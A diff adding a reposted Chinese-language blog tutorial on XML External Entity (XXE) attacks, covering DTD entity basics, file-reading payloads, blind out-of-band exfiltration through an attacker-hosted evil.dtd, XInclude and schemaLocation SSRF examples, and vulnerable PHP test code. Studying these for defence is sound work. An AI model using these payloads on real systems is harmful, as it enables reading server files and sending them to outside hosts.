@@ -285,6 +285,408 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/xxe学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="VegyChick">
+      <meta itemprop="description" content="沉迷渗透测试的信安菜鸟">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="菜鸟博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/07/30/xxe学习/" class="post-title-link" itemprop="url">xxe学习</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+
+          
+          
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-07-30 19:52:13 / 修改时间：20:07:46" itemprop="dateCreated datePublished" datetime="2019-07-30T19:52:13+08:00">2019-07-30</time>
+            </span>
+          
+
+          
+            
+
+            
+          
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          <br>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="XXE学习之路-STEP-BY-STEP"><a href="#XXE学习之路-STEP-BY-STEP" class="headerlink" title="XXE学习之路-STEP BY STEP"></a>XXE学习之路-STEP BY STEP</h2><p><img src="https://image.3001.net/images/20190428/1556414288_5cc4ff50285e3.jpg" alt="img"><a href="https://www.freebuf.com/author/漏斗社区" target="_blank" rel="noopener">漏斗社区</a>2017-12-11 </p>
+<p>首发专栏：<a href="http://zhuanlan.freebuf.com/column/index/?name=潜心学习的小白帽" target="_blank" rel="noopener">潜心学习的小白帽</a>关注</p>
+<p>近期看到OWASP TOP 10 2017 版中添加了XXE的内容便对XXE的一些知识进行梳理和总结。</p>
+<p><strong>0×00 背景</strong></p>
+<p>近期看到OWASP TOP 10 2017 版中添加了XXE的内容便对XXE的一些知识进行梳理和总结，XXE可以使用例如http，file等协议，所以可以利用支持的协议进行内网探测和内网入侵，这部分的内容后续在SSRF中补充。</p>
+<p>要点：libxml2.9.1及以后，默认不解析外部实体。测试的时候window下使用的是php5.2(libxml Version 2.7.7 ), php5.3(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。 </p>
+<p>参考链接：</p>
+<p><a href="http://vulhub.org/#/environments/php_xxe/" target="_blank" rel="noopener">http://vulhub.org/#/environments/php_xxe/</a></p>
+<p>有回显有报错测试代码：</p>
+<blockquote>
+<p>1.&lt;?php</p>
+<p>2.$xml=simplexml_load_string($_POST[‘xml’]);</p>
+<p>3.print_r($xml);</p>
+<p>4.?&gt;</p>
+</blockquote>
+<p>无回显无报错测试代码：</p>
+<blockquote>
+<p>1.&lt;?php</p>
+<p>2.$xml=@simplexml_load_string($_POST[‘xml’]);</p>
+<p>3.?&gt;</p>
+</blockquote>
+<p><strong>0×01 DTD的基础知识</strong></p>
+<p><strong>概念：</strong> </p>
+<p><strong>XXE：</strong>XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。</p>
+<p><strong>DTD：</strong>Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。 </p>
+<p><strong>参考链接：</strong><a href="http://www.w3school.com.cn/dtd/" target="_blank" rel="noopener">http://www.w3school.com.cn/dtd/</a></p>
+<p>首先了解下基本的PAYLOAD结构，然后再介绍每部分涉及的知识点，如下PAYLOAD开头进行了XML的声明，然后使用DTD声明实体(这里使用了file协议)，最后使用XML获取实体的数据。 </p>
+<p><strong>基本的PAYLOAD结构：</strong></p>
+<p><strong><img src="https://image.3001.net/images/20171211/15129732931168.png!small" alt="基本 PAY.png"></strong></p>
+<p><strong>使用DTD实体的攻击方式 ：</strong></p>
+<p><strong>DTD 引用方式(简要了解)：</strong></p>
+<p><strong>1. DTD 内部声明</strong></p>
+<!DOCTYPE 根元素 [元素声明]>
+
+<p><strong>2. DTD 外部引用</strong></p>
+<!DOCTYPE 根元素名称 SYSTEM “外部DTD的URI”>
+
+<p><strong>3. 引用公共DTD</strong></p>
+<!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”>
+
+<p>示例：</p>
+<blockquote>
+<?xml version=”1.0″?><p>   </p>
+<!DOCTYPE configuration PUBLIC “-//mybatis.org//DTD Config 3.0//EN”
+
+“http://mybatis.org/dtd/mybatis-3-config.dtd”>
+
+<p>……</p>
+<p>命名方法：以!DOCTYPE开始,configuration是文档根元素名称；</p>
+<p>PUBLIC表示是公共DTD；-表示是非ISO组织；mybatis.org表示组织；</p>
+<p>DTD 表示类型；Config 表示标签；3.0是标签后附带的版本号；</p>
+<p>EN表示DTD语言是英语；最后是DTD的URL；</p>
+</blockquote>
+<p><strong>DTD 实体声明(重点学习)：</strong></p>
+<p><strong>1. 内部实体声明</strong></p>
+<!ENTITY 实体名称 “实体的值”><p> </p>
+<p>一个实体由三部分构成:&amp;符号, 实体名称, 分号 (;)，这里&amp;不论在GET还是在POST中都需要进行URL编码，因为是使用参数传入xml的，&amp;符号会被认为是参数间的连接符号，示例：</p>
+<blockquote>
+<p>1.<!DOCTYPE foo [<!ELEMENT foo ANY ></p>
+<p>2.<!ENTITY xxe "Thinking">]&gt;</p>
+<p>3.<foo>&xxe;</foo></p>
+</blockquote>
+<p><a href="https://image.3001.net/images/20171211/15129734664946.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129734664946.png!small" alt="内部.png"></a></p>
+<p><strong>2. 外部实体声明</strong></p>
+<!ENTITY 实体名称 SYSTEM “URI/URL”><p> </p>
+<p>外部引用可支持http，file等协议，不同的语言支持的协议不同，但存在一些通用的协议，具体内容如下所示：</p>
+<p><a href="https://image.3001.net/images/20171211/15129735161149.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129735161149.png!small" alt="外部.png"></a></p>
+<p>示例：</p>
+<blockquote>
+<p>1.<!DOCTYPE foo [<!ELEMENT foo ANY ></p>
+<p>2.<!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" >]&gt;</p>
+<p>3.<foo>&xxe;</foo></p>
+</blockquote>
+<p><strong>3. 参数实体声明</strong></p>
+<blockquote>
+<p>1.<!ENTITY % 实体名称 “实体的值”></p>
+<p>2.or</p>
+<p>3.<!ENTITY % 实体名称 SYSTEM “URI”></p>
+</blockquote>
+<p>示例：</p>
+<blockquote>
+<p>1.<!DOCTYPE foo [<!ELEMENT foo ANY ></p>
+<p>2.<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" ></p>
+<p>3.%xxe;]&gt;</p>
+<p>4.<foo>&evil;</foo></p>
+</blockquote>
+<p>外部evil.dtd中的内容。</p>
+<blockquote>
+<!ENTITY evil SYSTEM “file:///c:/windows/win.ini” >
+</blockquote>
+<p><a href="https://image.3001.net/images/20171211/15129736722870.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129736722870.png!small" alt="evil.png"></a></p>
+<p><strong>4. 引用公共实体</strong></p>
+<!ENTITY 实体名称 PUBLIC “public_ID” “URI”>
+
+
+
+<p><strong>0×02 XXE的利用方式-DTD</strong></p>
+<p><strong>使用DTD的利用方式</strong></p>
+<p>利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用xxe进行SSRF的利用，基本上啥都能做了:-)</p>
+<p>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据。</p>
+<p><strong>1. 有回显情况：</strong></p>
+<p>有回显的情况可以使用如下的两种方式进行XXE注入攻击。</p>
+<blockquote>
+<p>1.<!DOCTYPE foo [<!ELEMENT foo ANY ></p>
+<p>2.<!ENTITY  xxe SYSTEM "file:///c:/windows/win.ini" >]&gt;</p>
+<p>3.<foo>&xxe;</foo></p>
+</blockquote>
+<blockquote>
+<p>1.<!DOCTYPE foo [<!ELEMENT foo ANY ></p>
+<p>2.<!ENTITY  % xxe SYSTEM "http://xxx.xxx.xxx/evil.dtd" ></p>
+<p>3.%xxe;]&gt;</p>
+<p>4.<foo>&evil;</foo></p>
+</blockquote>
+<p>外部evil.dtd中的内容。</p>
+<!ENTITY evil SYSTEM “file:///c:/windows/win.ini” >
+
+<p><a href="https://image.3001.net/images/20171211/1512973900504.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/1512973900504.png!small" alt="001.png"></a></p>
+<p>当然也可以进行内网站点的入侵(属于SSRF的内容 后续补充)。</p>
+<p><a href="https://image.3001.net/images/20171211/15129739223096.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129739223096.png!small" alt="002.png"></a></p>
+<p><strong>2. 无回显的情况：</strong></p>
+<p>可以使用外带数据通道提取数据，先使用php://filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</p>
+<blockquote>
+<p>1.&lt;!DOCTYPE updateProfile [</p>
+<p>\2.  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=./target.php"></p>
+<p>\3.  <!ENTITY % dtd SYSTEM "http://xxx.xxx.xxx/evil.dtd"></p>
+<p>4.%dtd;</p>
+<p>5.%send;</p>
+<p>6.]&gt;</p>
+</blockquote>
+<p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p>
+<blockquote>
+<p>1.&lt;!ENTITY % all</p>
+<p>\2. “<!ENTITY &#x25; send SYSTEM ‘http://xxx.xxx.xxx/?data=%file;’>”</p>
+<p>\3. &gt;</p>
+<p>4.%all;</p>
+</blockquote>
+<p>有报错直接查看报错信息。</p>
+<p><a href="https://image.3001.net/images/20171211/15129740453963.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129740453963.png!small" alt="baocuo.png"></a></p>
+<p>无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>
+<p><a href="https://image.3001.net/images/20171211/1512974092509.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/1512974092509.png!small" alt="wu  1.png"></a></p>
+<p><a href="https://image.3001.net/images/20171211/15129741091027.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129741091027.png!small" alt="wu 2.png"></a></p>
+<p><a href="https://image.3001.net/images/20171211/15129741255397.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129741255397.png!small" alt="wu 3.png"></a></p>
+<p><a href="https://image.3001.net/images/20171211/15129741458706.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129741458706.png!small" alt="wu 4.png"></a></p>
+<p><strong>XXE的拓展知识</strong></p>
+<p><strong>0×01 xmlns的基本知识</strong></p>
+<p>接下来说一些拓展的知识，这些攻击方式，需要有某些条件才能正常利用，下文仅对互联网上的一些知识进行梳理，暂未验证。</p>
+<p>概念： </p>
+<p><strong>XML Schema：</strong>称为可扩展标记语言架构，用来定义 XML 文档的合法构建模块，类似 DTD，Schema是DTD的替代者, 它比DTD可以做更多的事情 。</p>
+<p><strong>参考链接：</strong></p>
+<p><a href="http://www.w3school.com.cn/schema/schema_intro.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/schema/schema_intro.asp</a></p>
+<p>先说下xmlns，当有多个文档被一起使用时候不同文档可能带有不同内容和定义名称相同的元素，这样就会发生命名冲突，XML解释器无法确定如何处理这类冲突，而xmlns可以解决这个问题，我们为标签添加了一个 xmlns 属性，这样就为前缀赋予了一个与某个命名空间相关联的限定名称。此时再把它们放在一起，XML解析器就不会报错了。</p>
+<blockquote>
+<p>1.&lt;!– 这里xmlns:abc=”url”表示这个table是用abc作为标记，table的写法在url中定义 –&gt;</p>
+<p>2.&lt;abc:table xmlns:abc=”url”&gt;</p>
+<p>\3.  <a href="abc:tr" target="_blank" rel="noopener">abc:tr</a></p>
+<p>\4.    <a href="abc:td" target="_blank" rel="noopener">abc:td</a>Apples</p>
+<p>\5.    <a href="abc:td" target="_blank" rel="noopener">abc:td</a>Bananas</p>
+<p>\6.  </p>
+<p>7.</p>
+</blockquote>
+<p>语法：xmlns=”namespaceURI”表示默认的Namespace，可以不使用前缀；非默认的便需要使用前缀避免XML报错。 xmlns:namespace-prefix=”namespaceURI”，其中namespace-prefix为自定义前缀，只要在这个XML文档中保证前缀不重复即可；namespaceURI是这个前缀对应的XML Namespace的定义，如下例子中的xmlns:xsi表示使用xsi作为前缀的Namespace。</p>
+<p>xsi:schemaLocation属性便是Namespace为<a href="http://www.w3.org/2001/XMLSchema-instance里的schemaLocation属性。xsi:schemaLocation定义了XML" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema-instance里的schemaLocation属性。xsi:schemaLocation定义了XML</a> Namespace和对应的 XSD（Xml Schema Definition）文档的位置的关系。它的值由一个或多个URI引用对组成，两个URI之间以空白符分隔（空格和换行均可）。第一个URI是定义的 XML Namespace的值，第二个URI给出Schema文档的位置，Schema处理器将从这个位置读取Schema文档，文档的targetNamespace必须与第一个URI相匹，具体内容如下所示：</p>
+<blockquote>
+<p>1.<?xml version=”1.0″?></p>
+<p>2.</p>
+<p>3.&lt;note xmlns=”<a href="http://www.runoob.com”" target="_blank" rel="noopener">http://www.runoob.com”</a></p>
+<p>4.xmlns:xsi=”<a href="http://www.w3.org/2001/XMLSchema-instance”" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema-instance”</a></p>
+<p>5.xsi:schemaLocation=”<a href="http://www.springframework.org/schema/context" target="_blank" rel="noopener">http://www.springframework.org/schema/context</a></p>
+<p>\6.                    <a href="http://www.springframework.org/schema/context/spring-context.xsd”" target="_blank" rel="noopener">http://www.springframework.org/schema/context/spring-context.xsd”</a></p>
+<p>7.</p>
+<p>8.targetNamespace=”<a href="http://www.springframework.org/schema/context”" target="_blank" rel="noopener">http://www.springframework.org/schema/context”</a></p>
+<p>9…….</p>
+<p>10.</p>
+</blockquote>
+<p><strong>0×02 使用XML Schema 实体的攻击方式</strong></p>
+<p><strong>XML Schema攻击的分类</strong></p>
+<p>根据FB的小编对外文的翻译，得知XML Schema攻击分为：</p>
+<p>1.schemaLocation</p>
+<p>2.noNamespaceSchemaLocation</p>
+<p>3.XInclude。</p>
+<p>4.XSLT 攻击</p>
+<p><strong>1. schemaLocation</strong></p>
+<p>在OWASP 的XML External Entity Attacks(XXE)议题中有看到这这个知识点，但是具体的案例并未找到，FB给出了如下的示例。</p>
+<blockquote>
+<p>1.<?xml version=’1.0′?></p>
+<p>2.&lt;!DOCTYPE data [</p>
+<p>3.<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"></p>
+<p>4.%remote;</p>
+<p>5.]&gt;</p>
+<p>6.&lt;ttt:data xmlns:xsi=”<a href="http://www.w3.org/2001/XMLSchema-instance”" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema-instance”</a></p>
+<p>\7.   xmlns:ttt=”<a href="http://test.com/attack”" target="_blank" rel="noopener">http://test.com/attack”</a></p>
+<p>\8. xsi:schemaLocation=”ttt <a href="http://publicServer.com/&internal;”&gt;4" target="_blank" rel="noopener">http://publicServer.com/&internal;”&gt;4</a></p>
+</blockquote>
+<p><strong>2. noNamespaceSchemaLocation</strong></p>
+<p>与<strong>schemaLocation</strong>一样，在OWASP 的XML External Entity Attacks(XXE)议题中有看到这个知识点，但是具体的案例并未找到，FB给出了如下的示例，也给出了SSRF的示例，但是在示例中总觉得有些诡异，这也是我疑惑的地方。</p>
+<blockquote>
+<p>1.<?xml version=’1.0′?></p>
+<p>2.&lt;!DOCTYPE data [</p>
+<p>3.<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"></p>
+<p>4.%remote;</p>
+<p>5.]&gt;</p>
+<p>6.&lt;data xmlns:xsi=”<a href="http://www.w3.org/2001/XMLSchema-instance”" target="_blank" rel="noopener">http://www.w3.org/2001/XMLSchema-instance”</a></p>
+<p>\7.    xsi:noNamespaceSchemaLocation=”<a href="http://publicServer.com/&internal;”&gt;" target="_blank" rel="noopener">http://publicServer.com/&internal;”&gt;</a></p>
+</blockquote>
+<p><strong>3. XInclude</strong></p>
+<p>XInclude在XML Schema, DTD, and Entity Attacks 的文档中有提到，但是经过测试和查阅材料，在微软的将 XML 文档与 XInclude 合并在一起这篇文档中有提到并不是所有XML 语法分析程序都支持 XInclude，W3C在XInclude Implementations Report中列出了支持的列表，include的href属性中可以进行文件读取，也可以使用协议进行SSRF，freebuf中是使用DTD实体的方式再结合XInclude进行利用的，似乎觉得有些不大贴切，因为如果可以使用XInclude的话那么就不需要使用DTD了，直接在href属性中利用协议获取信息，即可；但是FB这种在属性处使用&internal;的思路值得借鉴。</p>
+<p><strong>XML Schema, DTD, and Entity Attacks</strong>中的示例：</p>
+<p><a href="https://image.3001.net/images/20171211/15129745755040.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/15129745755040.png!small" alt="示例.png"></a></p>
+<p>freebuf的示例，如下所示：</p>
+<blockquote>
+<p>1.<?xml version=”1.0″ encoding=”utf-8″?></p>
+<p>2.&lt;!DOCTYPE data [</p>
+<p>3.<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd"></p>
+<p>4.%remote;</p>
+<p>5.]&gt;</p>
+<p>6.<data xmlns:xi="”http://www.w3.org/2001/XInclude”">&lt;xi:include href=”<a href="http://192.168.2.31/&internal;”" target="_blank" rel="noopener">http://192.168.2.31/&internal;”</a> parse=”text”&gt;</data></p>
+</blockquote>
+<p>以上示例中<strong>external_entity_attribute.dtd</strong>文件的内容，根据示例中的参数实体payload的声明，在此处应该可以使用各种协议进行SSRF等操作。</p>
+<blockquote>
+<p>1.<!ENTITY % payload SYSTEM “file:///sys/power/image_size”></p>
+<p>2.<!ENTITY % param1 “<!ENTITY internal ‘%payload;’>”&gt;</p>
+<p>3.%param1;</p>
+</blockquote>
+<p><strong>4. XSLT 攻击</strong></p>
+<p>这个攻击方式在XML Out-Of-Band Data Retrieval有提到，可以通过如下的方式先用document()获得目标主机的信息，然后使用concat()将数据与evil主机进行拼接，然后document()访问拼接后的地址，便可以在evil主机日志上获得信息。 </p>
+<p>XSL中document() 用于访问外部 XML 文档中的节点；concat(string,string,…)用于返回字符串的拼接。</p>
+<p><a href="https://image.3001.net/images/20171211/1512974695640.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20171211/1512974695640.png!small" alt="拼接.png"></a></p>
+<p><strong>0×03 总结</strong></p>
+<p>互联网上XXE的文章还是很多的，所以先进行知识的梳理，方便学习和提高，本文参考了互联网上各个师傅和前辈的文章进行总结和梳理，在拓展部分的知识还有许多地方还未进行实践和验证，仅是先做个记录方便后续完善和测试，大家如果已经复现过了或者有更好场景，期待一起交流，如下是撰写本文的参考链接。</p>
+<p>参考链接：</p>
+<p><a href="http://www.w3school.com.cn/dtd/dtd_intro.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/dtd/dtd_intro.asp</a></p>
+<p><a href="http://www.w3school.com.cn/schema/schema_summary.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/schema/schema_summary.asp</a></p>
+<p><a href="http://www.w3school.com.cn/xml/xml_usedfor.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/xml/xml_usedfor.asp</a></p>
+<p><a href="https://www.w3.org/XML/2002/09/xinclude-implementation" target="_blank" rel="noopener">https://www.w3.org/XML/2002/09/xinclude-implementation</a></p>
+<p><a href="http://www.runoob.com/xsl/xsl-browsers.html" target="_blank" rel="noopener">http://www.runoob.com/xsl/xsl-browsers.html</a></p>
+<p><a href="http://blog.csdn.net/sunxing007/article/details/5684265" target="_blank" rel="noopener">http://blog.csdn.net/sunxing007/article/details/5684265</a></p>
+<p><a href="http://blog.csdn.net/a19881029/article/details/41890347" target="_blank" rel="noopener">http://blog.csdn.net/a19881029/article/details/41890347</a></p>
+<p><a href="http://blog.csdn.net/zhch152/article/details/8191377" target="_blank" rel="noopener">http://blog.csdn.net/zhch152/article/details/8191377</a></p>
+<p><a href="http://xmlwriter.net/xml_guide/entity_declaration.shtml" target="_blank" rel="noopener">http://xmlwriter.net/xml_guide/entity_declaration.shtml</a></p>
+<p><a href="http://www.mamicode.com/info-detail-1208231.html" target="_blank" rel="noopener">http://www.mamicode.com/info-detail-1208231.html</a></p>
+<p><a href="http://blog.csdn.net/u013224189/article/details/49759845" target="_blank" rel="noopener">http://blog.csdn.net/u013224189/article/details/49759845</a></p>
+<p><a href="http://www.91ri.org/17052.html" target="_blank" rel="noopener">http://www.91ri.org/17052.html</a></p>
+<p><a href="http://www.91ri.org/9539.html" target="_blank" rel="noopener">http://www.91ri.org/9539.html</a></p>
+<p><a href="http://www.91ri.org/12618.html" target="_blank" rel="noopener">http://www.91ri.org/12618.html</a></p>
+<p><a href="http://www.91ri.org/12814.html" target="_blank" rel="noopener">http://www.91ri.org/12814.html</a></p>
+<p><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing</a></p>
+<p><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#PHP" target="_blank" rel="noopener">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet#PHP</a></p>
+<p><a href="http://www.freebuf.com/articles/web/126788.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/126788.html</a></p>
+<p><a href="http://www.freebuf.com/articles/web/97833.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/97833.html</a></p>
+<p><a href="https://msdn.microsoft.com/zh-cn/library/aa302291.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/zh-cn/library/aa302291.aspx</a></p>
+<p><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a></p>
+<p><a href="http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf" target="_blank" rel="noopener">http://2013.appsecusa.org/2013/wp-content/uploads/2013/12/WhatYouDidntKnowAboutXXEAttacks.pdf</a></p>
+<p><a href="https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf" target="_blank" rel="noopener">https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf</a></p>
+<p><a href="https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf" target="_blank" rel="noopener">https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf</a></p>
+<p><a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf</a></p>
+<p><a href="https://github.com/BuffaloWill/oxml_xxe/tree/master/samples" target="_blank" rel="noopener">https://github.com/BuffaloWill/oxml_xxe/tree/master/samples</a></p>
+<p><a href="https://github.com/CHYbeta/Web-Security-Learning#xxe" target="_blank" rel="noopener">https://github.com/CHYbeta/Web-Security-Learning#xxe</a>(<a href="https://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1239375517" target="_blank" rel="noopener">https://www.freebuf.com/buf/plugins/cc/css.php?k=3cb185a485c81b23211eb80b75a406fd&amp;o=i&amp;t=1239375517</a></p>
+<h3 id="转载自：https-www-freebuf-com-column-156863-html"><a href="#转载自：https-www-freebuf-com-column-156863-html" class="headerlink" title="转载自：https://www.freebuf.com/column/156863.html"></a>转载自：<a href="https://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">https://www.freebuf.com/column/156863.html</a></h3>
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/Google-hack-常用命令/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -517,7 +919,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-count">12</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
